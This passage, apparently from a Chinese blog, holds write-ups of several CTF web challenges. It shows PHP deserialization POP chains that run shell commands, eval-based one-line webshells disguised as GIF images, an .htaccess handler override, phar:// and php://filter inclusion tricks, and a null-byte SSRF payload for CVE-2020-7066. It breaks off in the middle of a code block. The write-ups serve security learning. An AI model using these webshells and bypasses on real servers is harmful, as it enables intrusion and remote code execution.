punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\">//func checkcheck($data)&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token comment\">//  if(preg_match(......))&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\">//      die(something wrong);</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">//  &#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">//&#125;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token comment\">//function hint()&#123;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token comment\">//    echo \".......\";</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\">//    die();</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\">//&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>链子：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">NISA</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$fun</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"666\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$txw4ever</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'System(\"cat /fl*\");'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fun</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"show_me_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hahaha\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">TianXiWei</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"123456\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Ilovetxw</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$huang</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$su</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"1234567\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">four</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"TXW4EVER\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$fun</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'abc'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TianXiWei</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">ext</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Ilovetxw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">ext</span><span class=\"token operator\">-></span><span class=\"token property\">huang</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">four</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">ext</span><span class=\"token operator\">-></span><span class=\"token property\">huang</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Ilovetxw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">ext</span><span class=\"token operator\">-></span><span class=\"token property\">huang</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token operator\">-></span><span class=\"token property\">su</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">NISA</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h3 id=\"nisactf-2022midlevel\"><a class=\"anchor\" href=\"#nisactf-2022midlevel\">#</a> [NISACTF 2022]midlevel</h3>\n<h4 id=\"sstismarty\"><a class=\"anchor\" href=\"#sstismarty\">#</a> SSTI,Smarty</h4>\n<p>smarty 模板注入，和 [CISCN 2019 华东南] Web11 差不多。</p>\n<h3 id=\"hnctf-2022-week12048\"><a class=\"anchor\" href=\"#hnctf-2022-week12048\">#</a> [HNCTF 2022 Week1]2048</h3>\n<h4 id=\"js分析web前端\"><a class=\"anchor\" href=\"#js分析web前端\">#</a> JS 分析，Web，前端。</h4>\n<p>js 分析题，题目要求分数达到 20000，检查网页源代码，在 2048.js 中找到</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>score <span class=\"token operator\">></span> <span class=\"token number\">20000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t   <span class=\"token comment\">//var md5util= require (\"md5.js\"); // 写文件路径即可</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token number\">24685</span><span class=\"token punctuation\">,</span><span class=\"token number\">21916</span><span class=\"token punctuation\">,</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">103</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">53</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token number\">53</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>放在控制台上执行即可。</p>\n<h3 id=\"litctf-2023http-pro-max-plus\"><a class=\"anchor\" href=\"#litctf-2023http-pro-max-plus\">#</a> [LitCTF 2023]Http pro max plus</h3>\n<h4 id=\"http协议请求头信息收集\"><a class=\"anchor\" href=\"#http协议请求头信息收集\">#</a> HTTP 协议，请求头，信息收集。</h4>\n<p>进去显示只允许本地访问<br />\n请求头写 x-forwarded-for: 127.0.0.1<br />\n 被嘲讽</p>\n<p>换一种 client-ip: 127.0.0.1<br />\n 执行显示 You are not from <span class=\"exturl\" data-url=\"aHR0cDovL3Bvcm5odWIuY29t\">pornhub.com</span> !</p>\n<p>请求头写 referer: <span class=\"exturl\" data-url=\"aHR0cDovL3Bvcm5odWIuY29t\">pornhub.com</span><br />\n 执行显示 不开代理你想上 p 站？ 代理服务器地址是 Clash.win</p>\n<p>请求头写 via: Clash.win<br />\n 执行显示 用 Chrome 浏览器啊！</p>\n<p>请求头写 user-agent: Chrome<br />\n 执行显示 借一步说话 —&gt;&gt; /wtfwtfwtfwtf.php</p>\n<p>进入 wtfwtfwtfwtf.php<br />\nF12 看到 sejishikong.php</p>\n<p>进入 sejishikong.php 获得 flag.</p>\n<h3 id=\"gdouctf-2023泄露的伪装\"><a class=\"anchor\" href=\"#gdouctf-2023泄露的伪装\">#</a> [GDOUCTF 2023] 泄露的伪装</h3>\n<h4 id=\"php伪协议源码泄露文件包含\"><a class=\"anchor\" href=\"#php伪协议源码泄露文件包含\">#</a> PHP 伪协议，源码泄露，文件包含。</h4>\n<p>代开后没找到啥有用的信息，用 dirsearch 扫一下发现，发现 www.rar，下载后得到 /orzorz.php，访问：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cxk'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$cxk</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cxk'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cxk</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"ctrl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"洗洗睡吧\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"nononoononoonono\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?cxk=<span class=\"token property\">data</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//plain/text,ctrl</span></pre></td></tr></table></figure><h2 id=\"2023918\"><a class=\"anchor\" href=\"#2023918\">#</a> 2023/9/18</h2>\n<h3 id=\"nisactf-2022bingdundun~\"><a class=\"anchor\" href=\"#nisactf-2022bingdundun~\">#</a> [NISACTF 2022]bingdundun~</h3>\n<h4 id=\"文件上传php为协议phar协议\"><a class=\"anchor\" href=\"#文件上传php为协议phar协议\">#</a> 文件上传，PHP 为协议，Phar 协议。</h4>\n<p>打开题目后，提示只能上传图片和压缩包，尝试 mine 绕过，失败。</p>\n<p>换个思路，注意到题目说也能够上传压缩包，想到了 phar 协议和 zip 协议。</p>\n<p>写个木马文件 1.php，再把它压缩成 1.zip</p>\n<p>上传。</p>\n<p>提示</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/var/www/html\\/04b38fad0d1026999f9e3c6eb5ea709f.zip</pre></td></tr></table></figure><p>把路径记下来，回到刚才的上传界面</p>\n<p>注意到：</p>\n<p>/?bingdundun=upload</p>\n<p>联想刚刚上传后显示的 upload.php，猜想应该会自动在文件名后添加.php</p>\n<p>所以：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?bingdundun=<span class=\"token property\">phar</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//04b38fad0d1026999f9e3c6eb5ea709f.zip/1</span></pre></td></tr></table></figure><p>蚁剑连接后即可获得 flag。</p>\n<h3 id=\"gkctf-2020cve版签到\"><a class=\"anchor\" href=\"#gkctf-2020cve版签到\">#</a> [GKCTF 2020] cve 版签到</h3>\n<h4 id=\"00截断php伪协议http协议ssrfcve-2020-7066\"><a class=\"anchor\" href=\"#00截断php伪协议http协议ssrfcve-2020-7066\">#</a> %00 截断，PHP 伪协议，HTTP 协议，SSRF，cve-2020-7066</h4>\n<p>cve-2020-7066 漏洞原理：</p>\n<p>get_headers () 会截断 URL 中空字符后的内容</p>\n<pre><code>&lt;?php\n// user input\n$_GET['url'] = &quot;http://localhost%00.example.com&quot;;\n \n$host = parse_url($_GET['url'], PHP_URL_HOST);\nif (substr($host, -12) !== '.example.com') &#123;\n    die();\n&#125;\n$headers = get_headers($_GET['url']);\nvar_dump($headers);\n \n</code></pre>\n<p>get_headers () 函数截断 %00 后的字符串，导致读取到的 url 为</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdA==\">http://localhost</span></p>\n<p>本题进入后提示：</p>\n<p>You just view *.ctfhub.com</p>\n<p>点进去它给的网站，F12 打开开发者工具，在网络中的响应包中看到</p>\n<p>Hint:Flag in localhost</p>\n<p>传入：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?url=<span class=\"token property\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1%00www.ctfhub.com</span></pre></td></tr></table></figure><p>看到：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>[4] => <span class=\"token property\">Tips</span><span class=\"token punctuation\">:</span> Host must be end <span class=\"token module-modifier keyword\">with</span> <span class=\"token string\">'123'</span></pre></td></tr></table></figure><p>改一下：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?url=<span class=\"token property\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.123%00www.ctfhub.com</span></pre></td></tr></table></figure><p>得到 flag。</p>\n<h3 id=\"gxyctf-2019babyupload\"><a class=\"anchor\" href=\"#gxyctf-2019babyupload\">#</a> [GXYCTF 2019]BabyUpload</h3>\n<h4 id=\"htaccess文件上传mime绕过文件内容绕过\"><a class=\"anchor\" href=\"#htaccess文件上传mime绕过文件内容绕过\">#</a> .htaccess, 文件上传，MIME 绕过，文件内容绕过。</h4>\n<p>拿到题目尝试上传写好的一句话木马文件 1.php：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>回显后缀名不能有 ph！</p>\n<p>截个包看看能不能大写绕过，失败。</p>\n<p>改为 jpg 试试。</p>\n<p>提示上传的文件类型也太露骨了吧！</p>\n<p>mine 绕过一下：</p>\n<p>Content-Type: image/jpeg</p>\n<p>发送后再次报错：</p>\n<p>诶，别蒙我啊，这标志明显还是 php 啊</p>\n<p>发现是文件内容不能有 &lt;? 和？&gt;</p>\n<p>换一个一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GIF89a<span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>script language<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token operator\">></span>@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr></table></figure><p>成功！</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/var/www/html/upload/19e088857b6c91278532a300da9ddb78/1.jpg succesfully uploaded!</pre></td></tr></table></figure><p>接下来就上传.htaccess 就完事了.</p>\n<pre><code class=\"language-htaccess\">AddType application/x-httpd-php .php .jpg .png .gif \nSetHandler application/x-httpd-php\n</code></pre>\n<p>mine 绕过即可成功上传：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/var/www/html/upload/19e088857b6c91278532a300da9ddb78/.htaccess succesfully uploaded!</pre></td></tr></table></figure><p>访问 /upload/19e088857b6c91278532a300da9ddb78/1.jpg 即可。</p>\n<h3 id=\"hnctf-2022-week1interesting_include\"><a class=\"anchor\" href=\"#hnctf-2022-week1interesting_include\">#</a> [HNCTF 2022 Week1]Interesting_include</h3>\n<h4 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> php 伪协议</h4>\n<p>简单题，一句伪协议即可结束：</p>\n<p>/?filter=php://filter/read=convert.base64-encode/resource=flag.php</p>\n<h3 id=\"nisactf-2022popchains\"><a class=\"anchor\" href=\"#nisactf-2022popchains\">#</a> [NISACTF 2022]popchains</h3>\n<h4 id=\"反序列化php\"><a class=\"anchor\" href=\"#反序列化php\">#</a> 反序列化，PHP</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Happy New Year~ MAKE A WISH</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Happy New Year~ MAKE A WISH&lt;br>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wish'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wish'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">/***************************pop your 2022*****************************/</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td 